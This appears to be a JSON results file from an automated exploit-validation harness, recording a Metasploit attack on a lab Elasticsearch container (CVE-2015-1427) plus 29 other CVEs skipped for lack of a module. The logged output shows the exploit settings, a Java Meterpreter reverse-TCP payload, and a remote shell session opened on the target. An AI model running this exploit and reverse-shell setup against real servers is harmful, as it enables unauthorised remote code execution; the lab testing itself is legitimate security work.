@@ -1,0 +1,579 @@
+{
+  "artifact": {
+    "created_at": "2026-09-08T11:24:16Z",
+    "input_config": {
+      "path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\output-live-cve-2015-1427-fixture-validation-3\\resolver\\config\\exploit_config_before_AoFTs_r1.json",
+      "revision": 1,
+      "sha256": "f92c095a7fb014ab6b3451a31b2e287ba4a6b7126104e0bc7957721c46117773"
+    },
+    "phase": "before",
+    "run_id": "AoFTs"
+  },
+  "cves": [
+    {
+      "attempt": {
+        "attempt_id": "AoFTs-01-before-1",
+        "attempt_number": 1,
+        "check_evidence": {
+          "operation": {
+            "ended_at": null,
+            "exit_code": 0,
+            "started_at": null,
+            "state": "EXECUTED",
+            "stderr": "",
+            "stdout": "Loaded 1 modules:\n    1 exploit modules\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nTARGET => 0\nDOMAIN => WORKSTATION\nHTTP::Auth => auto\nHTTP::KrbOfferedEncryptionTypes => AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1\nKrbCacheMode => read-write\nKrbClockSkew => 0.0\nRHOSTS => 172.18.0.10\nRPORT => 9200\nSSLVersion => Auto\nTARGETURI => /\nPAYLOAD => java/meterpreter/reverse_tcp\nAutoLoadExtensions => [\"[stdapi]\"]\nAutoLoadStdapi => true\nAutoSystemInfo => true\nEnableUnicodeEncoding => false\nLHOST => 172.18.0.3\nLPORT => 4444\nPayloadUUIDTracking => false\nPingbackRetries => 0\nPingbackSleep => 30\nReverseAllowProxy => false\nReverseListenerThreaded => false\nSpawn => 2\n[+] 172.18.0.10:9200 - The target is vulnerable. Arbitrary Java execution confirmed via Groovy scripting\n",
+            "submitted": true
+          },
+          "verdict": "VULNERABLE"
+        },
+        "config": {
+          "path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\output-live-cve-2015-1427-fixture-validation-3\\resolver\\config\\exploit_config_before_AoFTs_r1.json",
+          "revision": 1,
+          "sha256": "f92c095a7fb014ab6b3451a31b2e287ba4a6b7126104e0bc7957721c46117773"
+        },
+        "cve_id": "CVE-2015-1427",
+        "ended_at": "2026-09-08T11:24:16Z",
+        "environment_validation": {
+          "code": null,
+          "message": null,
+          "observed": {
+            "container_id": "df9eafbca5f2004a1d2cede10b284f661f37b1b6b4cd304e77acb86383404b13",
+            "container_name": "victim-AoFTs",
+            "image_digest": "vulhub/elasticsearch@sha256:df18e56d6ca11e2f1f81a66f1c4e1b3ff50fe9ede7fcc461be652f06ec7486fa",
+            "image_id": "sha256:df18e56d6ca11e2f1f81a66f1c4e1b3ff50fe9ede7fcc461be652f06ec7486fa",
+            "ip_address": "172.18.0.10",
+            "network": "kalama-net",
+            "run_id": "AoFTs"
+          },
+          "valid": true
+        },
+        "exploit_evidence": {
+          "ended_at": null,
+          "exit_code": 0,
+          "started_at": null,
+          "state": "EXECUTED",
+          "stderr": "",
+          "stdout": "Loaded 1 modules:\n    1 exploit modules\n[*] No payload configured, defaulting to java/meterpreter/reverse_tcp\nTARGET => 0\nDOMAIN => WORKSTATION\nHTTP::Auth => auto\nHTTP::KrbOfferedEncryptionTypes => AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1\nKrbCacheMode => read-write\nKrbClockSkew => 0.0\nRHOSTS => 172.18.0.10\nRPORT => 9200\nSSLVersion => Auto\nTARGETURI => /\nPAYLOAD => java/meterpreter/reverse_tcp\nAutoLoadExtensions => [\"[stdapi]\"]\nAutoLoadStdapi => true\nAutoSystemInfo => true\nEnableUnicodeEncoding => false\nLHOST => 172.18.0.3\nLPORT => 4444\nPayloadUUIDTracking => false\nPingbackRetries => 0\nPingbackSleep => 30\nReverseAllowProxy => false\nReverseListenerThreaded => false\nSpawn => 2\n[*] Started reverse TCP handler on 172.18.0.3:4444 \n[*] Checking vulnerability...\n[*] Discovering TEMP path...\n[+] TEMP path on '/tmp'\n[*] Discovering remote OS...\n[+] Remote OS is 'Linux'\n[*] Trying to load metasploit payload...\n[*] Sending stage (63218 bytes) to 172.18.0.6\n[-] Failed to load extension: No module of the name [stdapi] found\n[+] Deleted /tmp/xLoXo.jar\n[*] Meterpreter session 1 opened (172.18.0.3:4444 -> 172.18.0.6:41558) at 2026-09-08 11:24:09 +0000\n[*] Session 1 created in the background.\n",
+          "submitted": true
+        },
+        "issues": [],
+        "metric_eligibility": {
+          "conditions": {
+            "config_complete": true,
+            "environment_validated": true,
+            "exploit_executed": true,
+            "exploit_required": true,
+            "invalidating_error": false
+          },
+          "eligible": true,
+          "exclusion_reason": null
+        },
+        "oracle": {
+          "completeness": "PARTIAL",
+          "evidence_basis": "CHECK",
+          "evidence_conflict": false,
+          "metric_eligibility": {
+            "conditions": {
+              "config_complete": true,
+              "environment_validated": true,
+              "exploit_executed": true,
+              "exploit_required": true,
+              "invalidating_error": false
+            },
+            "eligible": true,
+            "exclusion_reason": null
+          },
+          "verdict": "VULNERABLE"
+        },
+        "phase": "before",
+        "pre_attack": null,
+        "preconditions": [
+          {
+            "ended_at": "2026-09-08T11:23:35Z",
+            "execution_target": "kalama-workbench",
+            "exit_code": 0,
+            "started_at": "2026-09-08T11:23:35Z",
+            "state": "EXECUTED",
+            "stderr": "",
+            "stdout": "{\"_index\":\"kalama\",\"_type\":\"doc\",\"_id\":\"1\",\"_version\":2,\"created\":false}",
+            "step": 1,
+            "submitted": true
+          },
+          {
+            "ended_at": "2026-09-08T11:23:35Z",
+            "execution_target": "kalama-workbench",
+            "exit_code": 0,
+            "started_at": "2026-09-08T11:23:35Z",
+            "state": "EXECUTED",
+            "stderr": "",
+            "stdout": "{\"_shards\":{\"total\":10,\"successful\":10,\"failed\":0}}",
+            "step": 2,
+            "submitted": true
+          }
+        ],
+        "rank": 1,
+        "run_id": "AoFTs",
+        "session_evidence": {
+          "attribution": "UNKNOWN",
+          "baseline_session_ids": [],
+          "error": null,
+          "new_session_ids": [],
+          "post_session_ids": [],
+          "status": "COLLECTED"
+        },
+        "started_at": "2026-09-08T11:23:35Z"
+      },
+      "config_status": "READY_TO_EXECUTE",
+      "cve_id": "CVE-2015-1427",
+      "disposition": "EXPLOIT_SUCCEEDED",
+      "metric_eligibility": {
+        "conditions": {
+          "config_complete": true,
+          "environment_validated": true,
+          "exploit_executed": true,
+          "exploit_required": true,
+          "invalidating_error": false
+        },
+        "eligible": true,
+        "exclusion_reason": null
+      },
+      "oracle": {
+        "completeness": "PARTIAL",
+        "evidence_basis": "CHECK",
+        "evidence_conflict": false,
+        "metric_eligibility": {
+          "conditions": {
+            "config_complete": true,
+            "environment_validated": true,
+            "exploit_executed": true,
+            "exploit_required": true,
+            "invalidating_error": false
+          },
+          "eligible": true,
+          "exclusion_reason": null
+        },
+        "verdict": "VULNERABLE"
+      },
+      "rank": 1
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2020-15999",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 2
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2019-17571",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 3
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2022-23305",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 4
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2022-29155",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 5
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2019-8457",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 6
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2015-3253",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 7
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2022-25236",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 8
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2022-23302",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 9
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2022-23307",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 10
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2019-5482",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 11
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2021-43527",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 12
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2016-6814",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 13
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2019-3822",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 14
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2018-18312",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 15
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2018-18311",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 16
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2018-14618",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 17
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2021-31535",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 18
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2018-14600",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 19
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2019-12900",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 20
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2020-36221",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 21
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2020-36228",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 22
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2018-11236",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 23
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2019-5481",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 24
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2018-18314",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 25
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2015-9262",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 26
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2019-5953",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 27
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2018-16839",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 28
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2017-11462",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 29
+    },
+    {
+      "attempt": null,
+      "config_status": "NO_MSF_MODULE",
+      "cve_id": "CVE-2022-25235",
+      "disposition": "NO_MSF_MODULE",
+      "metric_eligibility": {
+        "eligible": false,
+        "exclusion_reason": "NO_MSF_MODULE"
+      },
+      "oracle": {
+        "verdict": "NOT_EVALUATED"
+      },
+      "rank": 30
+    }
+  ],
+  "schema": "kalama.attack-result/v1",
+  "summary": {
+    "CHECK_ONLY": 0,
+    "ENVIRONMENT_ERROR": 0,
+    "EXPLOIT_FAILED": 0,
+    "EXPLOIT_SUCCEEDED": 1,
+    "INCONCLUSIVE": 0,
+    "NOT_EXECUTED": 0,
+    "NO_MSF_MODULE": 29,
+    "attempted": 1,
+    "metric_eligible": 1,
+    "selected": 30
+  }
+}
